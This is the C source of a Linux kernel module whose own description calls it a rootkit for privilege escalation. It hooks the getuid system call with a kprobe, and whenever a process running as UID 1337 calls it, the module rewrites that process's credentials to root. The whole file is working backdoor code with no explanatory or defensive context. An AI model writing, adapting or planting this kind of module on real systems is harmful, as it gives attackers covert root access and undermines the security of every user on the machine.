#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan, FL");
MODULE_DESCRIPTION("Rootkit - PrivEsc via getuid syscall");
MODULE_VERSION("0.5");

static struct kprobe kp;

#define TRIGGER_UID 1337

static void set_root(void)
{
    struct cred *new_creds;

    new_creds = prepare_creds();
    if (new_creds == NULL) {
        return;
    }

    new_creds->uid.val = 0;
    new_creds->gid.val = 0;
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;

    commit_creds(new_creds);
}

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    
    if (current_uid().val == TRIGGER_UID) {
        set_root();
    }

    return 0; 
}

static int __init rootkit_init(void)
{
    int ret;

    kp.symbol_name = "__x64_sys_getuid";
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        return ret;
    }

    return 0;
}

static void __exit rootkit_exit(void)
{
    unregister_kprobe(&kp);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
